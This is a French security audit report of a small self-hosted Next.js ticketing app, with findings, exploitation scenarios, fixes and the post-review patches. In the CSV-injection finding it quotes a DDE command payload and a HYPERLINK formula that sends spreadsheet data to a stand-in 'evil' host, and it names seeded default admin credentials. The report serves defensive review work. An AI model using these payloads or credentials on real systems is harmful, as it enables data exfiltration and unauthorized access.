# Revue de sécurité — Billetterie école de danse

- **Date** : 2026-06-10
- **Périmètre** : `/billetterie` (Next.js 16 App Router, Prisma 6 / SQLite), lecture seule
- **Contexte** : self-hosted Raspberry Pi 5 derrière Nginx Proxy Manager (NPM) + Cloudflare. Pas de paiement en ligne. ~800 places, 2 représentations/an, 2-3 bénévoles admin.
- **Méthode** : lecture exhaustive de `app/`, `lib/`, `proxy.ts`, `next.config.ts`, `prisma/`, `scripts/`, `emails/` ; `pnpm audit --prod` ; vérification git de `.env`.

---

## 1. Résumé exécutif

**Verdict global : application saine et bien conçue pour son contexte.** L'architecture de sécurité est cohérente et nettement au-dessus de la moyenne pour un projet associatif : défense en profondeur (proxy + `requireAdmin` dans chaque page/action/route), validation zod systématique, sessions HMAC à comparaison constant-time, honeypot + rate-limit, accès public exclusivement par UUID, aucun `$queryRaw`, aucun `dangerouslySetInnerHTML`, emails échappés par React.

**Aucune vulnérabilité critique exploitable à distance n'a été trouvée.** Les constats sont essentiellement du durcissement. Le seul point réellement à corriger avant mise en production est le **seed qui crée des comptes admin avec un mot de passe faible (`admin1234`), y compris en production** : c'est exploitable uniquement si le seed est joué sur la base de prod, mais le risque est réel et le correctif trivial.

Les exigences du cahier des charges sont **toutes satisfaites**, avec une réserve mineure sur l'exigence 6 (un nom de famille transite dans une URL de redirection admin, donc potentiellement dans les access logs amont).

---

## 2. Tableau des constats

| # | Sévérité | Constat | Fichier |
|---|----------|---------|---------|
| C1 | **Élevée** | Le seed crée 2 comptes admin avec mot de passe faible (`admin1234`) **même en production** | `prisma/seed.ts:119-130, 278` |
| C2 | **Moyenne** | Injection de formule CSV dans l'export (cellules `= + - @` non neutralisées) | `app/api/admin/export/[repId]/route.ts:24-27` |
| C3 | **Moyenne** | `scannedAt` (heure client) non borné dans le passé/futur | `app/api/admin/scan/route.ts:22-46` |
| C4 | **Faible** | Rate-limit fondé sur `x-forwarded-for[0]`, spoofable si NPM mal configuré | `lib/rate-limit.ts`, `app/demande/actions.ts:43`, `app/admin/login/actions.ts:19-20` |
| C5 | **Faible** | Nom de famille injecté dans l'URL de redirection des actions « demandes » → access logs amont | `app/admin/(protected)/demandes/actions.ts:117` |
| C6 | **Faible** | Adresses email loggées en console (mode dev + erreurs Brevo) | `lib/email/send.ts:18,42,47` |
| C7 | **Faible** | `postcss <8.5.10` (XSS modéré) signalé par `pnpm audit` | dépendance transitive de `next` (build-time) |
| C8 | **Info** | Pas de CSP ; `bcrypt` cost 10 (acceptable) | `next.config.ts`, `app/admin/login/actions.ts:37` |
| C9 | **Info** | `repId` non validé (format) dans `scan-data` et `plan-state` (sans impact : requêtes vides) | `app/api/admin/scan-data/[repId]/route.ts`, `app/api/admin/plan-state/[repId]/route.ts` |

---

## 3. Détail par constat

### C1 — Comptes admin faibles seedés en production (Élevée)

**Fichier** : `prisma/seed.ts:119-130`, appelé inconditionnellement par `main()` ligne 278.

`seedDemoBookings()` est correctement gardé par `NODE_ENV !== 'production'` (ligne 280), mais **`seedAdmins()` ne l'est pas**. Il crée `admin1@example.com` / `admin2@example.com` avec le hash bcrypt du mot de passe `DEV_ADMIN_PASSWORD = 'admin1234'` quel que soit l'environnement.

**Scénario d'exploitation** : si l'opérateur lance `pnpm db:seed` sur la base de production (geste naturel pour initialiser le plan de salle et les représentations), deux comptes admin par défaut sont créés avec un mot de passe trivial et un email prévisible. Un attaquant qui devine que la stack vient de ce template teste `admin1@example.com / admin1234` et obtient un accès back-office complet (lecture des coordonnées de toutes les familles, annulation/déplacement de billets, export CSV). Le `update: {}` de l'upsert (ligne 126) protège un hash déjà modifié à la main, mais **pas** une première initialisation.

**Correctif recommandé** :
- Garder `seedAdmins()` derrière `NODE_ENV !== 'production'`, comme les bookings de démo ; en production, créer les comptes uniquement via `pnpm admin:create` (qui impose ≥ 8 caractères).
- À défaut, refuser de seeder un mot de passe par défaut si `NODE_ENV === 'production'` (lever une erreur explicite invitant à utiliser `admin:create`).

### C2 — Injection de formule CSV dans l'export (Moyenne)

**Fichier** : `app/api/admin/export/[repId]/route.ts:24-27`.

`champCsv()` gère correctement l'échappement CSV structurel (guillemets, `;`, retours ligne) mais **ne neutralise pas les cellules débutant par `=`, `+`, `-`, `@`** (ni tab / CR). Excel et LibreOffice interprètent ces cellules comme des formules.

**Scénario d'exploitation** : une famille saisit dans le champ « nom » ou « commentaire » une valeur comme `=cmd|'/c calc'!A1` ou `=HYPERLINK("http://evil/?"&A1&A2)`. Le champ est accepté par le schéma zod (le regex n'exclut pas `=`). Lorsqu'un bénévole ouvre l'export CSV dans Excel, la formule s'exécute sur son poste (exfiltration de cellules, déclenchement de contenu distant, voire exécution avec une chaîne DDE). C'est un vecteur classique « stored → client admin ».

**Correctif recommandé** : dans `champCsv()`, préfixer d'une apostrophe (`'`) ou d'un espace insécable toute valeur dont le premier caractère est `= + - @` (et tabulation / CR), puis appliquer l'échappement guillemets habituel. Exemple : `if (/^[=+\-@\t\r]/.test(valeur)) valeur = "'" + valeur`.

### C3 — `scannedAt` non borné (Moyenne)

**Fichier** : `app/api/admin/scan/route.ts:22-46`.

Le design « premier scan gagne » est correct et empêche le **dé-scan** : `updateMany({ where: { scannedAt: null } })` est atomique, et un re-POST renvoie `deja-scanne` sans rien modifier. Un bénévole compromis ne peut donc pas remettre un billet à `null` via cette route (bon point).

En revanche, `scannedAt` provient de l'horloge **client** (`z.iso.datetime()` valide le format mais pas la plage). Un bénévole malveillant ou un téléphone à l'heure fausse peut enregistrer un scan daté de 2099 ou 1970.

**Scénario d'exploitation** : impact limité (la valeur n'est qu'affichée comme heure de passage, aucune décision de sécurité ne s'appuie dessus), mais une heure aberrante peut semer la confusion à l'entrée (« déjà scanné à 03h00 ») et fausse les statistiques.

**Correctif recommandé** : borner `scannedAt` côté serveur à une fenêtre raisonnable, par ex. `[now - 24h, now + 5min]` ; hors fenêtre, soit clamper sur `now`, soit rejeter en 400. À défaut, simplement enregistrer l'heure serveur si l'écart dépasse un seuil.

### C4 — Rate-limit spoofable via `x-forwarded-for` (Faible)

**Fichiers** : `lib/rate-limit.ts`, `app/demande/actions.ts:43`, `app/admin/login/actions.ts:19-20`.

Le rate-limit en mémoire est adapté au contexte (process unique, faible volume, perte au redémarrage assumée). La clé est `x-forwarded-for[0]`. Si NPM ne **réécrit pas** cet en-tête mais se contente de l'ajouter, un client peut envoyer `X-Forwarded-For: <ip aléatoire>` à chaque requête et obtenir une clé différente → contournement total du rate-limit (formulaire public et login).

**Scénario d'exploitation** : bruteforce du login admin ou spam du formulaire public en variant l'en-tête. La protection bcrypt + le message générique limitent l'impact du bruteforce, mais le rate-limit ne joue plus son rôle.

**Correctif recommandé** : surtout **côté configuration amont** (voir §5) — faire en sorte que NPM écrase `X-Forwarded-For` avec l'IP réelle de Cloudflare / `CF-Connecting-IP`, et idéalement compléter avec un rate-limit Cloudflare. Côté code, on pourrait prendre le **dernier** maillon de confiance plutôt que le premier, mais cela dépend de la topologie du proxy : la bonne réponse est la config amont.

### C5 — Nom de famille dans l'URL de redirection (Faible)

**Fichier** : `app/admin/(protected)/demandes/actions.ts:117` (et messages d'erreur similaires).

`annulerAction` redirige vers `/admin/demandes?ok=Demande+de+<Nom>+annulée`. Le nom de la famille se retrouve donc dans l'URL, qui sera enregistrée dans les **access logs** de NPM / Cloudflare. L'exigence 6 demande qu'aucune donnée perso ne figure dans les URLs loggées. C'est une fuite mineure (logs internes, accès admin), mais elle contredit l'exigence à la lettre.

**Correctif recommandé** : passer un code de message générique (ex. `?ok=annulee`) traduit côté page, plutôt que d'interpoler le nom dans l'URL. Idem pour les autres messages contenant des données nominatives.

### C6 — Emails loggés en console (Faible)

**Fichier** : `lib/email/send.ts:18,42,47`.

En mode dev (pas de clé Brevo), l'adresse email du destinataire est loggée (`[email dev] → ...`). En prod, seuls les **échecs** Brevo loggent l'adresse. Donnée à caractère personnel dans les logs applicatifs. Le corps des emails n'est jamais loggé (bien). Impact faible (logs locaux du Pi), mais à connaître au regard du RGPD.

**Correctif recommandé** : en production, logger un identifiant non nominatif (ex. `bookingId`) plutôt que l'adresse, ou tronquer/hasher l'email dans les messages d'erreur.

### C7 — `postcss <8.5.10` (Faible / Info)

`pnpm audit --prod` remonte **1 vulnérabilité modérée** : `postcss` (XSS via `</style>` non échappé), tirée transitivement par `next`. C'est un outil **de build** (génération CSS), non exposé au runtime avec une entrée utilisateur : non exploitable dans ce déploiement.

**Correctif recommandé** : mettre à jour lors d'un prochain bump de `next` / dépendances (`pnpm update`), sans urgence.

### C8 — Durcissements (Info)

- **CSP absente** : `next.config.ts` couvre X-Frame-Options, nosniff, Referrer-Policy, Permissions-Policy. Une `Content-Security-Policy` (même permissive) ajouterait une couche anti-XSS. Optionnel ici (pas de contenu utilisateur rendu en HTML brut).
- **bcrypt cost 10** : acceptable. Passer à 12 améliorerait la résistance au bruteforce offline pour un coût négligeable (3 comptes).

### C9 — `repId` non validé en format (Info, pas de vuln)

`scan-data/[repId]` et `plan-state/[repId]` n'appliquent pas le regex de liste blanche utilisé par l'export. Sans impact : un `repId` inconnu retourne simplement des tableaux vides, et la route est protégée par session. Cohérence souhaitable, pas une faille.

---

## 4. Exigences du cahier des charges

| # | Exigence | État | Note |
|---|----------|------|------|
| 1 | zod sur **toute** entrée (formulaire, routes admin, scan, login, actions) | ✅ | `booking-schema`, `loginSchema`, `scanSchema`, `idSchema`, schémas placement/plan. Toutes les entrées validées. |
| 2 | Rate-limit formulaire + login, honeypot sur formulaire | ✅ | `rateLimit()` sur `demande:` et `login:` ; honeypot `website` traité avant zod (`actions.ts:50`) et masqué `aria-hidden`/`tabIndex=-1`. Réserve C4 sur la robustesse de la clé IP. |
| 3 | Cookies httpOnly + SameSite=Lax ; CSRF sur mutations admin | ✅ | `session.ts:55-61` (httpOnly, sameSite lax, secure en prod). Mutations = server actions (vérif d'origin intégrée Next) ; la seule route POST mutante (`/api/admin/scan`) est protégée par session. Aucun GET mutant. |
| 4 | Aucune énumération ; accès public par UUID | ✅ | `/billets/[publicToken]` → `notFound()` si inconnu ; `/api/qr/[token]` → 404 identique pour token mal formé **et** inconnu. Pas de différence exploitable. |
| 5 | Headers de sécurité de base dans next.config | ✅ | X-Frame-Options DENY, nosniff, Referrer-Policy, Permissions-Policy avec `camera=(self)`. |
| 6 | Aucune donnée perso dans les QR ni les URLs loggées | ⚠️ | QR n'encode que le `qrToken` (✅). **Réserve** : un nom de famille transite dans l'URL de redirection des actions demandes (C5) → access logs amont. À corriger pour respecter la lettre de l'exigence. |

**Checklist OWASP adaptée** :

- **Auth** : ✅ HMAC-SHA256 + `timingSafeEqual` + `exp` vérifié (`session.ts:39-45`) ; proxy couvre `/admin/*` **et** `/api/admin/*`, login exclu ; `requireAdmin`/`getAdminSession` présent dans **chaque** page, action et route admin vérifiés un par un (dashboard, demandes/actions, placement/actions, plan/actions, scan, scan-data, plan-state, export, login) ; bcrypt + hash factice pour timing homogène et message d'erreur unique → **pas d'énumération de comptes**.
- **Injections** : ✅ Prisma uniquement (aucun `$queryRaw`/`$executeRaw`). ⚠️ Injection de **formule CSV** dans l'export (C2). Emails : `name` interpolé est échappé par React (`react-email`) ; le sujet utilise le titre de la représentation (admin), pas de saut de ligne possible → pas d'injection d'en-tête. Aucun `dangerouslySetInnerHTML`.
- **Open redirect** : ✅ Le paramètre `retour` est re-sérialisé via liste blanche (`rep`/`statut`/`q`) et la redirection vise toujours `/admin/demandes`. Login redirige en dur vers `/admin`, pas de paramètre `next`.
- **IDOR** : ✅ Toutes les actions admin derrière `requireAdmin` ; tous les admins sont équivalents (pas de rôles), acceptable au contexte. `/billets/[token]` n'expose que ses propres données. `/api/qr` ne permet pas de sonder (404 uniforme).
- **Fuites** : ✅ `.env` est gitignoré (`.env*`) et **non committé** (vérifié : aucun commit ne touche `billetterie/.env`) ; `SESSION_SECRET` présent (64 caractères) ; `.env.example` ne contient aucun secret. ⚠️ Emails en logs (C6). Aucune stack trace ni détail Prisma renvoyé au client (les erreurs métier sont des messages français contrôlés ; P2002 traduit). Bookings de démo bien gardés par `NODE_ENV !== 'production'` — **mais** comptes admin seedés non gardés (C1).
- **Rate-limit en mémoire** : ⚠️ contournable si `x-forwarded-for` spoofable (C4) → reco config amont.
- **DoS basiques** : ✅ payloads bornés (nom 100, email 200, notes 500, partySize ≤ 8) ; pas de boucle non bornée ; endpoint QR ne génère un PNG **que** pour un ticket existant (pas de générateur ouvert).
- **Dépendances** : ⚠️ 1 vuln modérée build-time (`postcss`, C7) ; versions pinnées (next, react, react-dom) ou en caret raisonnable.
- **Scan** : ✅ POST idempotent, « premier scan gagne », **dé-scan impossible** via la route. ⚠️ `scannedAt` client non borné (C3).

---

## 5. Recommandations de configuration amont (NPM / Cloudflare)

Ces points ne relèvent pas du code mais conditionnent l'efficacité réelle des protections applicatives.

1. **Real IP / `X-Forwarded-For` (corrige C4)** : configurer NPM pour **écraser** (et non concaténer) `X-Forwarded-For` avec l'IP réelle fournie par Cloudflare (`CF-Connecting-IP`). Activer le module Real IP côté Nginx avec la liste des plages Cloudflare en `set_real_ip_from`, et `real_ip_header CF-Connecting-IP`. Sans cela, le rate-limit applicatif est contournable et les logs portent une IP non fiable.

2. **Rate-limit Cloudflare** : ajouter une règle de rate-limiting Cloudflare sur `/admin/login` (ex. 10 requêtes / minute / IP) et sur le formulaire public (`POST /`), en première ligne avant le Pi. C'est la défense robuste qui couvre le point faible du rate-limit en mémoire (perte au redémarrage, process unique).

3. **HSTS** : confirmer que Cloudflare (ou NPM) émet `Strict-Transport-Security` avec `max-age` élevé (≥ 6 mois) et `includeSubDomains`. La caméra de scan exige HTTPS ; HSTS verrouille le canal. (Géré en amont par design — à vérifier en pratique.)

4. **Restreindre l'accès `/admin` si possible** : envisager une règle Cloudflare Access (ou une simple Access Rule par IP / pays) limitant `/admin/*` et `/api/admin/*` aux IP des bénévoles, en complément de l'auth applicative. Optionnel mais peu coûteux pour 2-3 personnes.

5. **Logs** : si NPM/Cloudflare conservent les access logs, garder à l'esprit que les `publicToken` (UUID dans `/billets/<token>`) y figurent — ce sont des URLs de capacité. Limiter la rétention et l'accès à ces logs. La correction de C5 évitera en plus d'y voir des noms en clair.

---

## 6. Synthèse des 3 correctifs prioritaires

1. **C1** — Garder `seedAdmins()` derrière `NODE_ENV !== 'production'` ; en prod, créer les comptes via `pnpm admin:create` uniquement. (Évite des comptes `admin1234` exploitables.)
2. **C2** — Neutraliser l'injection de formule CSV dans `champCsv()` (préfixer les cellules commençant par `= + - @`).
3. **C4** (config amont) — Configurer NPM Real IP + un rate-limit Cloudflare sur le login et le formulaire public, pour que le rate-limit ne soit pas contournable via `X-Forwarded-For`.

---

## 7. Correctifs appliqués (2026-06-10, post-revue)

| Constat | Correctif | Fichier |
| --- | --- | --- |
| C1 (Élevée) | `seedAdmins()` ne tourne plus quand `NODE_ENV === 'production'` — comptes de prod via `pnpm admin:create` | `prisma/seed.ts` |
| C2 (Moyenne) | `champCsv()` préfixe d'une apostrophe les cellules commençant par `= + - @` | `app/api/admin/export/[repId]/route.ts` |
| C3 (Moyenne) | `scannedAt` client borné à [maintenant − 24 h, maintenant] | `app/api/admin/scan/route.ts` |
| C5 (Faible) | Plus de nom de famille dans l'URL de redirection après annulation | `app/admin/(protected)/demandes/actions.ts` |

Restent ouverts : C4 (config NPM/Cloudflare, voir §5), C6 (logs dev, assumé), C7 (postcss build-time), C8/C9 (durcissements optionnels).
